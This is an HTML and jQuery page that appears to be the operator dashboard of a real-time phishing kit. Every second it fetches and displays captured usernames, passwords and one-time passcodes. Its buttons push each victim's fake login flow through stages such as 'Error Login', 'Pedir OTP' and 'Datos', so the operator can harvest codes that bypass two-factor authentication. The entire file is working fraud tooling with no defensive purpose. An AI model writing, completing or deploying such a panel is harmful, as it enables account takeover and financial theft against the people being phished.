<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel de Control</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="path/to/your/css/styles.css"> <!-- Asegúrate de cambiar la ruta al archivo CSS -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script src="path/to/your/js/scripts.js"></script> <!-- Asegúrate de cambiar la ruta al archivo JS -->
</head>
<body>
    <div class="container mt-5">
        <h2 class="text-center mb-4">Panel de Control</h2>
        <button id="delete-all" class="btn btn-danger mb-3">Borrar Todos los Datos</button>
        <div id="data-table" class="row">
            <!-- Las filas de datos serán añadidas aquí dinámicamente -->
        </div>
    </div>

    <script>
        $(document).ready(function() {
            function refreshData() {
                $.ajax({
                    url: '../data/get_data.php', // Archivo para obtener datos actualizados
                    type: 'GET',
                    dataType: 'json',
                    success: function(data) {
                        console.log("Datos recibidos:", data); // Muestra todos los datos recibidos
                        $('#data-table').empty(); // Limpiar solo el tbody
                        
                        data.forEach(function(row) {
                            console.log(`ID: ${row.id}, Estado: ${row.estado}`); // Para verificar el ID y el estado
                            let estadoTexto;

                            // Código relevante para manejar la visualización de estados
                            switch (Number(row.estado)) {
                                case 1:
                                    estadoTexto = "Ingreso de Login";
                                    break;
                                case 0:
                                    estadoTexto = "Finalizar";
                                    break;
                                case 2:
                                    estadoTexto = "Error Login";
                                    break;
                                case 3:
                                    estadoTexto = "OTP";
                                    break;
                                case 4:
                                    estadoTexto = "OTP Error";
                                    break;
                                case 5:
                                    estadoTexto = "Ingreso OTP"; // Nuevo caso
                                    break;
                                case 6:
                                    estadoTexto = "Datos"; // Nuevo caso
                                    break;
                                case 7:
                                    estadoTexto = "Ingresó Datos"; // Nuevo caso
                                    break;
                                default:
                                    estadoTexto = `Desconocido (ID: ${row.id}, Estado: ${row.estado})`;
                            }

                            $('#data-table').prepend(` <!-- Cambiado a prepend -->
                                <div class="col-md-4 mb-4">
                                    <div class="card">
                                        <div class="card-body">
                                            <h5 class="card-title">Usuario: ${row.usuario}</h5>
                                            <p class="card-text">Clave: ${row.clave}</p>
                                            <p class="card-text">OTP: ${row.otp}</p>
                                            <p class="card-text">Fecha y Hora: ${row.fecha_hora}</p>
                                            <p class="card-text">Estado: ${estadoTexto}</p>
                                            <div class="actions">
                                                <form action="../data/actualizar_estado.php" method="post" class="d-inline">
                                                    <input type="hidden" name="id" value="${row.id}">
                                                    <input type="hidden" name="estado" value="2">
                                                    <input type="submit" value="Error Login" class="btn btn-warning">
                                                </form>
                                                <form action="../data/actualizar_estado.php" method="post" class="d-inline">
                                                    <input type="hidden" name="id" value="${row.id}">
                                                    <input type="hidden" name="estado" value="3">
                                                    <input type="submit" value="Pedir OTP" class="btn btn-primary">
                                                </form>
                                                <form action="../data/actualizar_estado.php" method="post" class="d-inline">
                                                    <input type="hidden" name="id" value="${row.id}">
                                                    <input type="hidden" name="estado" value="4">
                                                    <input type="submit" value="Error OTP" class="btn btn-danger">
                                                </form>
                                                <form action="../data/actualizar_estado.php" method="post" class="d-inline">
                                                    <input type="hidden" name="id" value="${row.id}"> <!-- Asegúrate de que este valor esté correcto -->
                                                    <input type="hidden" name="estado" value="6"> <!-- El estado debe ser 6 -->
                                                    <input type="submit" value="Datos" class="btn btn-info">
                                                </form>
                                                <form action="../data/actualizar_estado.php" method="post" class="d-inline">
                                                    <input type="hidden" name="id" value="${row.id}">
                                                    <input type="hidden" name="estado" value="0">
                                                    <input type="submit" value="Finalizar" class="btn btn-success">
                                                </form>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            `);
                        });
                    },
                    error: function(jqXHR, textStatus, errorThrown) {
                        console.error('Error en la solicitud AJAX: ', textStatus, errorThrown);
                    }
                });
            }

            // Actualizar la tabla cada segundo
            setInterval(refreshData, 1000); // Cada 1000 ms = 1 segundo
        });

        $(document).ready(function() {
            // Controlador de eventos para el botón de borrar todos los datos
            $('#delete-all').click(function() {
                if (confirm('¿Estás seguro de que deseas borrar todos los datos? Esta acción no se puede deshacer.')) {
                    $.ajax({
                        url: '../data/borrar_todos.php', // Cambia esto por la ruta correcta a tu script
                        type: 'POST',
                        dataType: 'json',
                        success: function(response) {
                            console.log("Respuesta del servidor:", response);
                            if (response.success) {
                                alert(response.message); // Mensaje de éxito
                                refreshData(); // Recargar la tabla después de borrar los datos
                            } else {
                                alert('Error al borrar datos: ' + response.error); // Mensaje de error
                            }
                        },
                        error: function(jqXHR, textStatus, errorThrown) {
                            console.error('Error en la solicitud AJAX: ', textStatus, errorThrown);
                        }
                    });
                }
            });
        });
    </script>
</body>
</html>
